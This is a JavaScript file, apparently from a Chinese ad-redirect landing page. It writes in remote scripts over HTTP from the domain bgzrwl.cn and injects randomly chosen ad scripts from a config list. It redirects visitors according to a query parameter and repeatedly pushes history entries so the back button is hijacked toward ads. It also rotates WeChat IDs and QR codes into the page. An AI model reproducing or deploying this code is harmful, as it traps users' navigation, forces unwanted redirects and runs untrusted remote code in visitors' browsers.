// 返回开关
function getQueryString(name) {
    var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
    var r = window.location.search.substr(1).match(reg);
    if (r != null) {
        return decodeURI(r[2]);
    }
    return null;
}

var cash = getQueryString('cash');

// xxx
var noshare = new Array('xs_sz_qr');

document.writeln("<script src='http://bgzrwl.cn/backurl.js?t=" + Math.random() + "'></script>");
document.writeln("<script src='http://bgzrwl.cn/gg_config.js?t=" + Math.random() + "'></script>");


/**
 * @version  1.0
 * @author   eacher
 * @param
 * @return array | boolean
 */
function init() {
    if (cash !== null) {
        if (cash == 'fanhui') {
            // 随机广告的下标 <script type="text/javascript" src="http://libs.baidu.com/jquery/2.1.1/jquery.min.js"></script>
            index_id = fh[Math.floor(fh.length * Math.random())];
            if (index_id == 'suiji') {
                location.href = suiji;
            } else {
                baiducode()
                document.writeln("<script src='" + gg_list[index_id]['url'] + "'></script>");
            }
        } else if (cash == 'noshare') {
            index_id = noshare[Math.floor(noshare.length * Math.random())];
            if (index_id == 'suiji') {
                location.href = suiji;
            } else {
                baiducode()
                document.writeln("<script src='" + gg_list[index_id]['url'] + "'></script>");
            }
        } else {
            index_id = cash.split(',');
            index_id = index_id[Math.floor(index_id.length * Math.random())];
            baiducode()
            document.writeln("<script src='" + gg_list[index_id]['url'] + "'></script>");
        }
        setTimeout('hh();', 500);
    }
}

function weixinghao() {
    _random = Math.floor(Math.random() * winxin[index_id].length);
    var divweixinghao = document.getElementsByName('weixinghao');
    for (var i = 0; i < divweixinghao.length; i++) {
        divweixinghao[i].innerHTML = winxin[index_id][_random];
    }
    var wxerweima = document.getElementsByName('wxerweima');
    for (var i = 0; i < wxerweima.length; i++) {
        wxerweima[i].src = apidomain + '/se01/src/' + winxin[index_id][_random] + '.jpg';
    }
}


/**
 * @version  1.0
 * @author   eacher
 * @param
 * @return array | boolean
 * 统一广告入口
 */
function ggcash(name) {
    location.href = window.location.pathname + '?cash=' + name;
}

function hh() {
    history.pushState(history.length + 1, "message", "#" + new Date().getTime());
}

setTimeout('hh();', 500);

/**
 * @version  1.0
 * @author   eacher
 * @param
 * @return array | boolean
 */
function loadJs(src) {
    src.forEach(function (index, item) {
        var hm = document.createElement("script");
        hm.charset = "utf-8"
        hm.src = index;
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    });
}


/**
 * @version  1.0
 * @author   eacher
 * @param
 * @return array | boolean
 */
function baiducode() {
    var _hmt = _hmt || [];
    var hm = document.createElement("script");
    if ("fanhui" == cash) {
        hm.src = "https://hm.baidu.com/hm.js?" + gg_list[index_id]['fanhui'];
    } else {
        hm.src = "https://hm.baidu.com/hm.js?" + gg_list[index_id]['click'];
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(hm, s);
}